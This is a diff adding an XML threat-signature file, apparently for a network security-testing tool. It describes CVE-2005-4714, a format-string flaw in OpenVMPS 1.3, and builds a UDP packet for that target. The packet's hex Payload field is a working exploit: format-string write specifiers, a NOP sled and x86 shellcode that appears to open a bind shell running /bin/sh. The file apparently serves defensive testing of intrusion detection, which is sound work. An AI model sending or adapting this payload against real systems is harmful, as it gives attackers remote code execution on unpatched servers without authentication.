@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="OpenVMPS Logging Function Format String"/>
+    <EngDesc display="true" value="This threat sends a malformed packet to the OpenVMPS server which triggers a format string flaw within a logging function allowing remote execution. OpenVMPS is a vlan policy manager and typically listens on port 1589."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="OpenVMPS"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="OpenVMPS_OpenVMPS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="OpenVMPS_OpenVMPS_1.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://gotfault.net/research/exploit/gexp-openvmpsd.c"/>
+    <CVEID display="true" value="CVE-2005-4714"/>
+    <bugtraqID display="true" value="15072"/>
+    <OSVDB display="true" value="19910"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="000001095782af0700c000a80001003c263721a4" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632751829488593750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1139634516" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$ProprietarydestPort" checksum="" length="" Payload="410141014141414100000C0200B92E2E2E7CE504087EE50408252E36323633376425313924686E252E35313937376425323024686E909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C031DBB017CD8031DBF7E3B066534353435389E14BCD8089C75266687A6943665389E1B01050515789E1B066CD80B066B304CD8050505789E143B066CD8089D989C3B03F49CD8041E2F851686E2F7368682F2F626989E3515389E1B00BCD80"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
